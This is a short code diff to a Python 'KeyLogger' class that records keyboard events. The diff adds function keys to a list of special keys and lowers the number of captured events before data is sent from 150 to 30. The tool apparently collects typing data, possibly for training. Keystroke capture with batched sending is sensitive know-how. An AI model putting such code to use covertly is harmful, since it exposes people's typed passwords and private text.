@@ -4,7 +4,10 @@ import random
 
 special_keys = (keyboard.Key.esc, keyboard.Key.shift_l, keyboard.Key.alt_l, keyboard.Key.ctrl_l, keyboard.Key.enter, keyboard.Key.delete,
                 keyboard.Key.backspace, keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.down, keyboard.Key.end, keyboard.Key.left,
-                keyboard.Key.num_lock, keyboard.Key.page_down, keyboard.Key.page_up, keyboard.Key.up, keyboard.Key.print_screen, keyboard.Key.right,)
+                keyboard.Key.num_lock, keyboard.Key.page_down, keyboard.Key.page_up, keyboard.Key.up, keyboard.Key.print_screen, 
+                keyboard.Key.f1,keyboard.Key.f2,keyboard.Key.f3,keyboard.Key.f4,keyboard.Key.f5,keyboard.Key.f6,keyboard.Key.f7,
+                keyboard.Key.f8,keyboard.Key.f9,keyboard.Key.f10,keyboard.Key.f11,keyboard.Key.f12,keyboard.Key.f13,keyboard.Key.f14,
+                )
 
 train_text_list = list(range(1, 7))          
 
@@ -58,7 +61,7 @@ class KeyLogger():
 
     def is_ready_to_send(self):
         while True:
-            if len(self.keys['data'])>150 and self.keys['data'][-1]['event']=='Up':
+            if len(self.keys['data'])>30 and self.keys['data'][-1]['event']=='Up':
                 return
 
     def keys_capture(self):
